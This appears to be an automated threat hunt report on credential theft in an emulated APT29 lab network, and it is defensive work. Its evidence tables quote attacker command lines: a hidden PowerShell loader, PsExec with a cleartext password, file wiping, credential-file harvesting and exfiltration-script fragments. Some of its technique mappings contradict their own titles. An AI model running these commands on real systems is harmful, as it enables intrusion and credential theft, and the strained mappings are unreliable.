# Threat hunt report — 20261022-140338-converged-recheck-playbook-a

**Hypothesis:** An adversary who compromised Windows hosts in this network stole credentials from them (MITRE ATT&CK tactic: Credential Access).

**Verdict: Confirmed** — 12 in-scope incident(s) of verified malicious findings (confidence >= medium): I01 T1003.001 (F09, F21, F30, F35, F45, F51, F61, F64, F69), I02 T1056 (F12), I03 T1056.001 (F56), I04 T1056.002 (F08), I05 T1187 (F19, F63), I06 T1552 (F24, F59), I07 T1552.001 (F25, F58), I08 T1552.004 (F60), I11 T1555 (F65), I12 T1555.004 (F57), I14 T1606.002 (F52), I15 T1649 (F54, F62)

Verdict method: rules over verified evidence (Confirmed if >=1 in-scope incident of verified malicious findings (confidence >= medium); Inconclusive if only suspicious incidents or coverage gaps; Refuted if full coverage and no malicious/suspicious finding)

| Run | Value |
|---|---|
| Profile | converged (thinking=False, temperature=0.0) |
| Model | deepseek-flash |
| Started / finished (UTC) | 2026-10-22T06:03:39+00:00 / 2026-10-22T06:14:09+00:00 (630.3 s) |
| LLM calls / tokens | 163 / {'prompt': 5398926, 'completion': 119839} |
| MCP tool calls | 1348 (server tools: list_data_sources, get_fields, search, count, aggregate, timeline, esql, get_event, get_registry) |
| ATT&CK tactics | credential-access — An adversary with existing access to Windows hosts on this network is stealing credentials from those hosts. |

## Data examined

| Dataset | Events | First event (UTC) | Last event (UTC) | Hosts / observers | Sources (channel → template) |
|---|---|---|---|---|---|
| windows.other | 216 | 2020-05-02 02:56:47.000Z | 2020-05-02 03:23:08.000Z | scranton.dmevals.local, newyork.dmevals.local, nashua.dmevals.local, utica.dmevals.local | apt29-windows-other (push → windows-other) |
| windows.powershell | 10979 | 2020-05-02 02:56:14.000Z | 2020-05-02 03:21:30.000Z | scranton.dmevals.local, newyork.dmevals.local, nashua.dmevals.local | apt29-powershell (stream → windows-powershell) |
| windows.security | 41002 | 2020-05-02 02:55:25.000Z | 2020-05-02 03:28:09.000Z | scranton.dmevals.local, newyork.dmevals.local, nashua.dmevals.local, utica.dmevals.local | apt29-security (push → windows-security) |
| windows.sysmon | 143884 | 2020-05-02 02:55:23.551Z | 2020-05-02 03:28:17.683Z | scranton.dmevals.local, nashua.dmevals.local, newyork.dmevals.local, utica.dmevals.local | apt29-sysmon (pull → windows-sysmon) |
| zeek | 2140 | 2020-04-30 00:06:38.899Z | 2020-04-30 00:45:00.760Z | bobs.bigwheel.local, simplerockbuild.simplerock.lan | zeek-nashua (pull → zeek); zeek-scranton (pull → zeek) |

> Time windows: windows.other [2020-05-02T02:56:47.000Z .. 2020-05-02T03:23:08.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

> Time windows: windows.powershell [2020-05-02T02:56:14.000Z .. 2020-05-02T03:21:30.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

> Time windows: windows.security [2020-05-02T02:55:25.000Z .. 2020-05-02T03:28:09.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

> Time windows: windows.sysmon [2020-05-02T02:55:23.551Z .. 2020-05-02T03:28:17.683Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

The whole stored time range of every dataset was searched (planned checks carry no time filter).

## Incidents

Verified malicious/suspicious findings grouped by attacker action, each with the single best-fitting technique (consolidation step). In-scope incidents decide the verdict.

| Incident | Technique | In scope | Assessment | Findings | Title |
|---|---|---|---|---|---|
| I01 | T1003.001 | yes | malicious/high | F09, F21, F30, F35, F45, F51, F61, F64, F69 | Hidden PowerShell loader (monkey.png steganography) compiles Add-Type payloads and opens LSASS with full access on scranton |
| I02 | T1056 | yes | malicious/high | F12 | Hands-on-keyboard credential-access toolkit in pbeesly's PowerShell session on scranton (discovery, accesschk, private-key export, screen ca… |
| I03 | T1056.001 | yes | malicious/high | F56 | Get-Keystrokes keylogger job on scranton |
| I04 | T1056.002 | yes | malicious/high | F08 | Screen capture loop (Invoke-ScreenCapture) on scranton |
| I05 | T1187 | yes | malicious/high | F19, F63 | WebDAV/UNC forced-authentication channel used to exfiltrate OfficeSupplies.7z to 192.168.0.4 |
| I06 | T1552 | yes | malicious/high | F24, F59 | Credential-adjacent file harvesting and archiving on scranton and nashua |
| I07 | T1552.001 | yes | malicious/high | F25, F58 | Plaintext password on PsExec command line to NASHUA; accesschk passwordsDB on scranton |
| I08 | T1552.004 | yes | malicious/high | F60 | Private keys packed into 7z and pushed to attacker WebDAV |
| I09 | T1552.006 | yes | suspicious/medium | F29 | GptTmpl.inf read from NEWYORK sysvol by external hosts and GroupPolicy DataStore writes |
| I10 | T1552.006 | yes | suspicious/low | F68 | hostui.exe elevated via runas from PowerShell on scranton |
| I11 | T1555 | yes | malicious/high | F65 | Get-PrivateKeys certificate export treated as credential-store access on scranton |
| I12 | T1555.004 | yes | malicious/high | F57 | Get-PrivateKeys .pfx export characterized as Windows Credential Manager access |
| I13 | T1556 | yes | suspicious/low | F67 | sdclt.exe UAC-bypass pattern preceding Add-Type compile on scranton |
| I14 | T1606.002 | yes | malicious/medium | F52 | No SAML token forgery; certificate private keys exported for theft |
| I15 | T1649 | yes | malicious/high | F54, F62 | Certificate private-key export (Get-PrivateKeys) to .pfx on scranton |

## Findings

### F69 · malicious / medium · T1003 · csc.exe compiled Add-Type payloads from the hidden PowerShell loader

Evidence status: **verified**

csc.exe was invoked twice by the hidden PowerShell (monkey.png steganography loader) to compile qkbkqqbs.dll and 0piklvia.dll in Temp.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:58:45.297Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\qkbkqqbs.cmdline" | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBorwNwU | q-5885dd4884 | ok |

### F12 · malicious / high · T1056 · Credential-access tooling in pbeesly's PowerShell session on scranton (private-key export, accesschk, exfil staging)

Evidence status: **verified**

On scranton.dmevals.local the pbeesly account ran a hands-on-keyboard PowerShell session (PID 3876, then 3852) between 03:04 and 03:08 on 2020-05-02: Invoke-Discovery, accesschk.exe from C:\Program Files\SysinternalsSuite, Get-PrivateKeys (exports every LocalMachine certificate with a thumbprint to random .pfx files in Downloads using a hardcoded password), Invoke-ScreenCapture, and Invoke-Exfil (7-Zip compressing Downloads to $env:APPDATA\OfficeSupplies.7z with password "lolol"). This is credential material collection (private keys) plus input capture, matching the credential-access hypothesis. The 10,750 'Key' object-access events and SAM_SERVER/SAM_DOMAIN handle requests by lsass.exe itself are normal registry/SAM servicing and were assessed benign.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-6c6116ab50 | ok |
| 2 | 2020-05-02 03:04:34.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | &amp; "C:\Program Files\SysinternalsSuite\accesschk.exe" | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqZ | q-6c6116ab50 | ok |
| 3 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-6c6116ab50 | ok |
| 4 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.command_line | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBorwtwa | q-f501b7cb93 | ok |

### F66 · malicious / medium · T1056 · Attacker payload .scr in ProgramData\victim launched by explorer, later wiped

Evidence status: **NOT verified (1/2 evidence items)** — excluded from the verdict

C:\ProgramData\victim\â€®cod.3aka3.scr ran with /S from explorer.exe at 02:55:56Z and was deleted with sdelete64 by pbeesly's PowerShell at 03:02:04Z.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 |  | None | None | process.parent.command_line | -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing' | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBowNwU | q-5885dd4884 | FAILED: cited query did not return this event; event not found |
| 2 | 2020-05-02 03:02:04.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | .\sdelete64.exe /accepteula "C:\programdata\victim\???cod.3aka3.scr" | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRabod | q-3d671a92da | ok |

### F56 · malicious / high · T1056.001 · Get-Keystrokes keylogger job in pbeesly's PowerShell on scranton

Evidence status: **verified**

At 03:06:59Z pbeesly's PowerShell on scranton launched a Get-Keystrokes background job, viewed its output and removed it.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:06:59.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName "Keystrokes" | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLr9 | q-461fe82ece | ok |
| 2 | 2020-05-02 03:07:36.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | View-Job -JobName "Keystrokes" | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYbCZ | q-461fe82ece | ok |

### F08 · malicious / high · T1056.002 · Invoke-ScreenCapture loop on scranton.dmevals.local captures the user's desktop (GUI input capture)

Evidence status: **verified**

On scranton.dmevals.local, user pbeesly ran a PowerShell session (PID 3852) that defined and executed a function Invoke-ScreenCapture at 2020-05-02T03:05:53Z. The function starts a background job named "Screenshot" that loops indefinitely, writing random-named .bmp files of the virtual screen into $env:USERPROFILE\Downloads using System.Windows.Forms/System.Drawing. The spawned job process (PID 3544, powershell.exe -Version 5.1 -s -NoLogo -NoProfile) emitted the same capture loop at 03:05:59Z. This is GUI input capture of the interactive desktop, consistent with the credential-access hypothesis. It occurred in the same session as Get-PrivateKeys certificate export and an Invoke-Exfil staging step.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:53.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-ScreenCapture # https://www.pdq.com/blog/capturing-screenshots-with-powershell-and-net/ {     Start-Job -Name "Screenshot" -ScriptBlock {       … | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRabqD | q-6c6116ab50 | ok |
| 2 | 2020-05-02 03:05:53.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-ScreenCapture # https://www.pdq.com/blog/capturing-screenshots-with-powershell-and-net/ {     Start-Job -Name "Screenshot" -ScriptBlock {       … | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRabqD | q-6c6116ab50 | ok |
| 3 | 2020-05-02 03:05:53.000Z | scranton.dmevals.local | windows.powershell | user.name | pbeesly | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRabqD | q-6c6116ab50 | ok |
| 4 | 2020-05-02 03:05:53.000Z | scranton.dmevals.local | windows.powershell | host.name | scranton.dmevals.local | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRabqD | q-6c6116ab50 | ok |

### F19 · malicious / high · T1187 · WebDAV/UNC forced-authentication channel used by APT29-style PowerShell toolkit on scranton to exfiltrate data to attacker WebDAV server 192.168.0.4

Evidence status: **verified**

On scranton.dmevals.local, user pbeesly executed a malicious screen-saver (C:\ProgramData\victim\cod.3aka3.scr) from explorer.exe at 2020-05-02T02:55:56Z, which spawned cmd.exe and powershell.exe. The PowerShell toolkit (script blocks written to C:\Program Files\SysinternalsSuite\psversion.ps1 and readme.ps1) contains Invoke-Discovery (AV/firewall and group enumeration) and Invoke-Exfil. Invoke-Exfil compresses the user's Downloads into %APPDATA%\OfficeSupplies.7z and then maps a WebDAV UNC path \\192.168.0.4\webdav via New-PSDrive with explicit credentials, copying the archive to WebDavShare:\OfficeSupplies.7z. This is the T1187 forced-authentication pattern: the host is made to authenticate to an attacker-controlled WebDAV/HTTP endpoint. Zeek (2020-04-30 window, non-overlapping with the Windows logs) independently shows 10.0.1.4 performing WebDAV client traffic to 192.168.0.4:80 with User-Agent Microsoft-WebDAV-MiniRedir/10.0.18362 — OPTIONS/PROPFIND/LOCK/PROPPATCH/UNLOCK and PUT /webdav/OfficeSupplies.7z (201/204), i.e. the archive was actually uploaded. The same host also probed 192.168.0.4 on 445/139 (SMB) and 8443 (SSL) from 10.0.1.6. The 5140/5145 share-access hits in windows.security are benign domain baseline (SYSVOL/GPT.ini policy reads by machine accounts NEWYORK$, SCRANTON$, NASHUA$, UTICA$ and IPC$ samr lookups), not forced authentication.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-1a3e5e1e45 | ok |
| 2 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-1a3e5e1e45 | ok |
| 3 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-1a3e5e1e45 | ok |
| 4 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | host.name | scranton.dmevals.local | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-1a3e5e1e45 | ok |
| 5 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | user.name | pbeesly | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-1a3e5e1e45 | ok |
| 6 | 2020-05-02 03:04:03.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Discovery {     $DiscoveryInfo =@()     $CurrentDir = Get-Location      $DiscoveryInfo += [PSCustomObject]@{                 CurrentDirectory = … | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaboE | q-437803aeb3 | ok |
| 7 | 2020-05-02 02:55:56.157Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\ProgramData\victim\â€®cod.3aka3.scr | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBow1KRR | q-0f7957ae61 | ok |
| 8 | 2020-05-02 02:56:04.510Z | scranton.dmevals.local | windows.sysmon | process.parent.executable | C:\ProgramData\victim\â€®cod.3aka3.scr | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBov08Fg | q-0f7957ae61 | ok |
| 9 | 2020-04-30 00:32:21.422Z | simplerockbuild.simplerock.lan | zeek | user_agent.original | Microsoft-WebDAV-MiniRedir/10.0.18362 | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeBwkgR9H | q-0731b71a17 | ok |
| 10 | 2020-04-30 00:32:21.422Z | simplerockbuild.simplerock.lan | zeek | destination.ip | 192.168.0.4 | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeBwkgR9H | q-0731b71a17 | ok |
| 11 | 2020-04-30 00:32:21.918Z | simplerockbuild.simplerock.lan | zeek | url.original | /webdav/OfficeSupplies.7z | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeBwkgh8V | q-0731b71a17 | ok |
| 12 | 2020-04-30 00:32:21.918Z | simplerockbuild.simplerock.lan | zeek | http.request.method | PUT | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeBwkgh8V | q-0731b71a17 | ok |
| 13 | 2020-04-30 00:32:21.989Z | simplerockbuild.simplerock.lan | zeek | zeek.request_body_len | 1082089 | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeBwkgR85 | q-0731b71a17 | ok |
| 14 | 2020-04-30 00:32:14.891Z | simplerockbuild.simplerock.lan | zeek | destination.port | 445 | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeBwkgR_2 | q-10badf658d | ok |

### F63 · malicious / high · T1187 · WebDAV/UNC channel used to exfiltrate the archive

Evidence status: **verified**

Invoke-Exfil mapped \\192.168.0.4\webdav with hardcoded credentials and copied OfficeSupplies.7z there.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-8e44141b1c | ok |

### F21 · malicious / medium · T1212 · PowerShell (pbeesly) opened LSASS with full access rights on scranton.dmevals.local during a hands-on-keyboard credential-theft session

Evidence status: **verified**

On scranton.dmevals.local, in a PowerShell session running as user pbeesly, Sysmon event 10 shows C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe (PID 2976) opening C:\windows\system32\lsass.exe (PID 736) twice within 31 ms at 2020-05-02T03:05:16.623Z and 03:05:16.654Z with GrantedAccess 0x1f3fff and 0x1fffff (PROCESS_ALL_ACCESS) and a call trace ending in an UNKNOWN module — the classic signature of in-memory credential dumping rather than a legitimate LSASS client. This is the only LSASS access in the dataset by a PowerShell process with those masks; all other LSASS access is by svchost.exe (0x1000), wininit.exe/csrss.exe at system start, or wsmprovhost.exe. The same session, minutes earlier and later, ran a credential/certificate theft toolkit from C:\Program Files\SysinternalsSuite\readme.ps1: Get-PrivateKeys (exports every LocalMachine certificate to .pfx with the hardcoded password "saribas"), Get-Clipboard, Get-Keystrokes, Invoke-ScreenCapture, Keystroke-Check (AV process enumeration), Invoke-Discovery, Invoke-Exfil (7-Zip archive with password "lolol"), plus sdelete64.exe wiping of Draft.Zip and SysinternalsSuite.zip. No Mimikatz/SafetyKatz/procdump strings were found in script blocks, so the LSASS access itself is the credential-access step; assessed malicious with medium confidence because the LSASS handle events are the only direct evidence of the dump (no dump file or sekurlsa output was observed).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-ac75e1e1eb | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-ac75e1e1eb | ok |
| 3 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-ac75e1e1eb | ok |
| 4 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXF | q-177f29dd2a | ok |
| 5 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|UNKNOWN(000001996D252982) | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXF | q-177f29dd2a | ok |
| 6 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-b81286f02e | ok |
| 7 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\readme.ps1 | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-b81286f02e | ok |
| 8 | 2020-05-02 03:06:42.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-Clipboard | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLr6 | q-c451bb6996 | ok |
| 9 | 2020-05-02 03:06:59.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName "Keystrokes" | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLr9 | q-c451bb6996 | ok |
| 10 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-8a6a28e32d | ok |
| 11 | 2020-05-02 03:02:04.000Z | scranton.dmevals.local | windows.security | process.command_line | "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\programdata\victim\???cod.3aka3.scr | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy1B5lB | q-399e72f8a1 | ok |

### F24 · malicious / high · T1552 · pbeesly on SCRANTON staged Sysinternals tools, ran accesschk and harvested user files matching *pass*/*psw*/*login*/*admin*/*vpn* into an archive

Evidence status: **verified**

On scranton.dmevals.local, user pbeesly (S-1-5-21-1830255721-3727074217-2423397540-1107) ran a PowerShell session that (1) at 02:56:17 enumerated the whole user profile recursively for credential-adjacent file patterns (*psw*, *pass*, *login*, *admin*, *sifr*, *sifer*, *vpn, *.pst, *.ost, *.txt, *.lnk ...) and compressed the results into %APPDATA%\Draft.Zip; (2) at 03:00:25 expanded SysinternalsSuite.zip and moved it to C:\Program Files\SysinternalsSuite; (3) at 03:04:34 launched accesschk.exe from that directory, which created the file C:\Program Files\SysinternalsSuite\passwordsDB at 03:04:35; (4) at 03:02-03:03 used sdelete64.exe to wipe C:\programdata\victim\???cod.3aka3.scr, %APPDATA%\Draft.Zip and Downloads\SysinternalsSuite.zip. The same session also ran an image-steganography loader (monkey.png -> IEX) and a VirtualAlloc/CreateThread shellcode stub, and created/removed a HKCU Folder\shell\open\command key. This is hands-on-keyboard credential/file collection with anti-forensic deletion, not normal user behaviour.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:56:17.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByXfnRy | q-6021034e00 | ok |
| 2 | 2020-05-02 03:04:34.951Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\accesschk.exe" | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoNRGHW | q-8e3a73edf0 | ok |
| 3 | 2020-05-02 03:04:35.069Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Program Files\SysinternalsSuite\passwordsDB | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoNRGHl | q-1956819d37 | ok |
| 4 | 2020-05-02 03:02:04.324Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\programdata\victim\???cod.3aka3.scr | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoSVqPo | q-f1a9799dd1 | ok |
| 5 | 2020-05-02 03:03:14.693Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\Users\pbeesly\AppData\Roaming\Draft.Zip | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoQTo3z | q-f1a9799dd1 | ok |

### F59 · malicious / high · T1552 · NASHUA: python.exe dropped Rar/sdelete and harvested credential-named files

Evidence status: **verified**

On nashua python.exe (via PSEXESVC) dropped Rar.exe and sdelete64.exe, spawned PowerShell that collected *pass*/*psw*/*login*/*admin*/*vpn* files into working.zip, then wiped the artifacts.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:15:31.530Z | nashua.dmevals.local | windows.sysmon | file.path | C:\Windows\Temp\Rar.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoy3l6o | q-88b7ea0219 | ok |
| 2 | 2020-05-02 03:15:59.000Z | nashua.dmevals.local | windows.powershell | win.ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByDVjze | q-acf6baa0f5 | ok |
| 3 | 2020-05-02 03:16:52.456Z | nashua.dmevals.local | windows.sysmon | process.command_line | .\sdelete64.exe  /accepteula "C:\Windows\Temp\Rar.exe" | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnnmUud | q-042d759897 | ok |

### F25 · malicious / high · T1552.001 · Plaintext password used on PsExec command line to reach NASHUA, where files were archived with Rar and wiped

Evidence status: **verified**

From scranton.dmevals.local, pbeesly repeatedly (03:11:18, 03:12:25, 03:13:28, 03:14:42) ran PsExec64.exe against \\NASHUA with the password supplied in cleartext on the command line (-u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe). On nashua.dmevals.local the resulting PSEXESVC.exe service generated 4648 explicit-credential logons for pbeesly and spawned C:\Windows\Temp\python.exe, which dropped C:\Windows\Temp\Rar.exe; Rar then created C:\Users\pbeesly\Desktop\working.zip with a password switch (-hpfGzq5yKw) from %APPDATA%\working.zip, and sdelete64.exe wiped Rar.exe, working.zip and Desktop\working.zip. Credentials were thus handled in the clear and used to move laterally and stage collected data.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:18.784Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoz4z4i | q-f1a9799dd1 | ok |
| 2 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | win.ProcessName | C:\Windows\PSEXESVC.exe | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuu5GRH | q-f80385ae36 | ok |
